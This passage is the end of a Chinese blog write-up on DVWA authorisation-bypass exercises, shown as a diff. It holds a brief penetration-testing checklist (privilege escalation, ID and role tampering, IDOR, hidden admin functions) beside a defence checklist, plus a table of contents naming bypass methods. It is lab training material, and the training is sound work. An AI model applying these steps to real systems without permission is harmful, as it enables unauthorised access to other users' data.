+<h2 id="实战建议"><a href="#实战建议" class="headerlink" title="实战建议"></a>实战建议</h2><p><strong>渗透测试清单：</strong></p>
+<ol>
+<li>✅ 枚举所有功能和端点</li>
+<li>✅ 测试水平越权（访问其他用户数据）</li>
+<li>✅ 测试垂直越权（访问管理员功能）</li>
+<li>✅ 修改用户ID&#x2F;角色参数</li>
+<li>✅ 测试IDOR漏洞</li>
+<li>✅ 尝试不同HTTP方法</li>
+<li>✅ 检查隐藏的管理功能</li>
+</ol>
+<p><strong>防御清单：</strong></p>
+<ol>
+<li>✅ 实施RBAC</li>
+<li>✅ 每个操作都验证权限</li>
+<li>✅ 验证资源所有权</li>
+<li>✅ 使用CSRF Token</li>
+<li>✅ 记录所有授权失败</li>
+<li>✅ 最小权限原则</li>
+<li>✅ 定期审计权限</li>
+</ol>
+<p><strong>道德准则：</strong></p>
+<ul>
+<li>只在授权环境测试</li>
+<li>不越权访问真实用户数据</li>
+<li>学习是为了构建安全的访问控制</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>点这里请我吃个小蛋糕吧～～</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechat.jpg" alt="caixuya WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="caixuya Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>caixuya
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://caixuya.github.io/2025/11/20/Authorisation_Bypass_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" title="DVWA - Authorisation Bypass (权限绕过) 攻防练习详解">http://caixuya.github.io/2025/11/20/Authorisation_Bypass_攻防练习/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/11/20/XSS_Stored_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="prev" title="DVWA - XSS Stored (存储型XSS) 攻防练习详解">
+      <i class="fa fa-chevron-left"></i> DVWA - XSS Stored (存储型XSS) 攻防练习详解
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2025/11/20/Brute_Force_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/" rel="next" title="DVWA - Brute Force (暴力破解) 攻防练习详解">
+      DVWA - Brute Force (暴力破解) 攻防练习详解 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="nav-number">2.</span> <span class="nav-text">漏洞简介</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%EF%BC%88Authorisation-Bypass%EF%BC%89%EF%BC%9F"><span class="nav-number">2.1.</span> <span class="nav-text">什么是权限绕过（Authorisation Bypass）？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%B0%B4%E5%B9%B3%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%EF%BC%88Horizontal-Privilege-Escalation%EF%BC%89"><span class="nav-number">2.2.</span> <span class="nav-text">1. 水平权限绕过（Horizontal Privilege Escalation）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%9E%82%E7%9B%B4%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87%EF%BC%88Vertical-Privilege-Escalation%EF%BC%89"><span class="nav-number">2.3.</span> <span class="nav-text">2. 垂直权限绕过（Vertical Privilege Escalation）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%8A%9F%E8%83%BD%E7%BA%A7%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87"><span class="nav-number">2.4.</span> <span class="nav-text">3. 功能级权限绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Low-%E9%9A%BE%E5%BA%A6"><span class="nav-number">3.</span> <span class="nav-text">Low 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87"><span class="nav-number">3.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">3.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="nav-number">3.3.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%AD%A5%E9%AA%A4"><span class="nav-number">3.4.</span> <span class="nav-text">攻击步骤</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%9A%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7%E6%95%B0%E6%8D%AE"><span class="nav-number">3.4.1.</span> <span class="nav-text">步骤1：水平越权 - 访问其他用户数据</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%9A%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E5%88%A0%E9%99%A4%E5%85%B6%E4%BB%96%E7%94%A8%E6%88%B7"><span class="nav-number">3.4.2.</span> <span class="nav-text">步骤2：垂直越权 - 删除其他用户</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%9A%E6%89%B9%E9%87%8F%E6%94%BB%E5%87%BB"><span class="nav-number">3.4.3.</span> <span class="nav-text">步骤3：批量攻击</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A5%E9%AA%A44%EF%BC%9A%E6%9F%A5%E6%89%BE%E9%9A%90%E8%97%8F%E7%9A%84%E7%AE%A1%E7%90%86%E5%8A%9F%E8%83%BD"><span class="nav-number">3.4.4.</span> <span class="nav-text">步骤4：查找隐藏的管理功能</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Medium-%E9%9A%BE%E5%BA%A6"><span class="nav-number">4.</span> <span class="nav-text">Medium 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-1"><span class="nav-number">4.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-1"><span class="nav-number">4.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4"><span class="nav-number">4.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95"><span class="nav-number">4.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E4%BC%AA%E9%80%A0Referer%E5%A4%B4"><span class="nav-number">4.5.1.</span> <span class="nav-text">方法1：伪造Referer头</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E5%88%A9%E7%94%A8%E8%A7%92%E8%89%B2%E6%A3%80%E6%9F%A5%E6%BC%8F%E6%B4%9E"><span class="nav-number">4.5.2.</span> <span class="nav-text">方法2：利用角色检查漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A-x2F-%E5%8A%AB%E6%8C%81"><span class="nav-number">4.5.3.</span> <span class="nav-text">方法3：会话固定&#x2F;劫持</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#High-%E9%9A%BE%E5%BA%A6"><span class="nav-number">5.</span> <span class="nav-text">High 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-2"><span class="nav-number">5.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-2"><span class="nav-number">5.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E5%A2%9E%E9%98%B2%E6%8A%A4-1"><span class="nav-number">5.3.</span> <span class="nav-text">新增防护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%8D%E5%AD%98%E5%9C%A8%E7%9A%84%E6%BC%8F%E6%B4%9E-1"><span class="nav-number">5.4.</span> <span class="nav-text">仍存在的漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95-1"><span class="nav-number">5.5.</span> <span class="nav-text">绕过方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%951%EF%BC%9A%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86%E7%BB%95%E8%BF%87"><span class="nav-number">5.5.1.</span> <span class="nav-text">方法1：类型混淆绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%952%EF%BC%9A%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="nav-number">5.5.2.</span> <span class="nav-text">方法2：参数污染</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%953%EF%BC%9A%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A"><span class="nav-number">5.5.3.</span> <span class="nav-text">方法3：会话固定</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Impossible-%E9%9A%BE%E5%BA%A6"><span class="nav-number">6.</span> <span class="nav-text">Impossible 难度</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87-3"><span class="nav-number">6.1.</span> <span class="nav-text">攻击目标</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E7%AB%AF%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90-3"><span class="nav-number">6.2.</span> <span class="nav-text">后端代码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%8C%E5%96%84%E7%9A%84%E9%98%B2%E6%8A%A4%E6%9C%BA%E5%88%B6"><span class="nav-number">6.3.</span> <span class="nav-text">完善的防护机制</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E6%97%A0%E6%B3%95%E6%94%BB%E7%A0%B4%EF%BC%9F"><span class="nav-number">6.4.</span> <span class="nav-text">为什么无法攻破？</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">7.</span> <span class="nav-text">防御建议</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%B6%E6%9E%84%E5%B1%82%E9%9D%A2"><span class="nav-number">7.1.</span> <span class="nav-text">架构层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%AE%9E%E6%96%BDRBAC%EF%BC%88%E5%9F%BA%E4%BA%8E%E8%A7%92%E8%89%B2%E7%9A%84%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%89"><span class="nav-number">7.1.1.</span> <span class="nav-text">1. 实施RBAC（基于角色的访问控制）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E9%9B%86%E4%B8%AD%E7%9A%84%E6%9D%83%E9%99%90%E6%A3%80%E6%9F%A5"><span class="nav-number">7.1.2.</span> <span class="nav-text">2. 集中的权限检查</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%B1%82%E9%9D%A2"><span class="nav-number">7.2.</span> <span class="nav-text">代码层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%AF%8F%E4%B8%AA%E6%93%8D%E4%BD%9C%E9%83%BD%E9%AA%8C%E8%AF%81%E6%9D%83%E9%99%90"><span class="nav-number">7.2.1.</span> <span class="nav-text">1. 每个操作都验证权限</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E9%AA%8C%E8%AF%81%E8%B5%84%E6%BA%90%E6%89%80%E6%9C%89%E6%9D%83"><span class="nav-number">7.2.2.</span> <span class="nav-text">2. 验证资源所有权</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E4%BD%BF%E7%94%A8%E7%99%BD%E5%90%8D%E5%8D%95"><span class="nav-number">7.2.3.</span> <span class="nav-text">3. 使用白名单</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E9%98%B2%E6%AD%A2%E5%8F%82%E6%95%B0%E7%AF%A1%E6%94%B9"><span class="nav-number">7.2.4.</span> <span class="nav-text">4. 防止参数篡改</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%91%E6%8E%A7%E5%B1%82%E9%9D%A2"><span class="nav-number">7.3.</span> <span class="nav-text">监控层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E8%AE%B0%E5%BD%95%E6%89%80%E6%9C%89%E6%8E%88%E6%9D%83%E5%A4%B1%E8%B4%A5"><span class="nav-number">7.3.1.</span> <span class="nav-text">1. 记录所有授权失败</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%BC%82%E5%B8%B8%E8%A1%8C%E4%B8%BA%E6%A3%80%E6%B5%8B"><span class="nav-number">7.3.2.</span> <span class="nav-text">2. 异常行为检测</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A1%86%E6%9E%B6%E5%B1%82%E9%9D%A2"><span class="nav-number">7.4.</span> <span class="nav-text">框架层面</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Laravel%E7%A4%BA%E4%BE%8B"><span class="nav-number">7.4.1.</span> <span class="nav-text">Laravel示例</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E4%B8%AD%E9%97%B4%E4%BB%B6"><span class="nav-number">7.4.2.</span> <span class="nav-text">使用中间件</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93%E5%AF%B9%E6%AF%94"><span class="nav-number">8.</span> <span class="nav-text">总结对比</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F"><span class="nav-number">9.</span> <span class="nav-text">常见攻击向量</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E7%9B%B4%E6%8E%A5%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8%EF%BC%88IDOR%EF%BC%89"><span class="nav-number">9.1.</span> <span class="nav-text">1. 直接对象引用（IDOR）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93"><span class="nav-number">9.2.</span> <span class="nav-text">2. 参数污染</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86"><span class="nav-number">9.3.</span> <span class="nav-text">3. 路径遍历</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-HTTP%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87"><span class="nav-number">9.4.</span> <span class="nav-text">4. HTTP方法绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AE%9E%E6%88%98%E5%BB%BA%E8%AE%AE"><span class="nav-number">10.</span> <span class="nav-text">实战建议</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="caixuya"
+      src="/images/avatar.gif">
+  <p class="site-author-name" itemprop="name">caixuya</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives">
+          <span class="site-state-item-count">46</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Caixuya" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Caixuya" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:214089030@qq.com" title="E-Mail → mailto:214089030@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">粤ICP备20064368号-1 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">caixuya</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="Symbols count total">374k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="Reading time total">5:40</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/undefined/anime.min.js"></script>
+  <script src="/undefined/pjax/pjax.min.js"></script>
+  <script src="//cdn.jsdelivr.net/jquery/2.1.3/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.pack.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+<script src="/js/bookmark.js"></script>
+
+  <script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '#page-configurations',
+    '.content-wrap',
+    '.post-toc-wrap',
+    '.languages',
+    '#pjax'
+  ],
+  switches: {
+    '.post-toc-wrap': Pjax.switches.innerHTML
+  },
+  analytics: false,
+  cacheBust: false,
+  scrollTo : !CONFIG.bookmark.enable
+});
+
+window.addEventListener('pjax:success', () => {
+  document.querySelectorAll('script[data-pjax], script#page-configurations, #pjax script').forEach(element => {
+    var code = element.text || element.textContent || element.innerHTML || '';
+    var parent = element.parentNode;
+    parent.removeChild(element);
+    var script = document.createElement('script');
+    if (element.id) {
+      script.id = element.id;
+    }
+    if (element.className) {
+      script.className = element.className;
+    }
+    if (element.type) {
+      script.type = element.type;
+    }
+    if (element.src) {
+      script.src = element.src;
+      // Force synchronous loading of peripheral JS.
+      script.async = false;
+    }
+    if (element.dataset.pjax !== undefined) {
+      script.dataset.pjax = '';
+    }
+    if (code !== '') {
+      script.appendChild(document.createTextNode(code));
+    }
+    parent.appendChild(script);
+  });
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js"></script>
+<script src="//cdn.jsdelivr.net/npm/instantsearch.js@4/dist/instantsearch.production.min.js"></script>
+<script src="/js/algolia-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div id="pjax">
+  
+
+  
+
+    </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
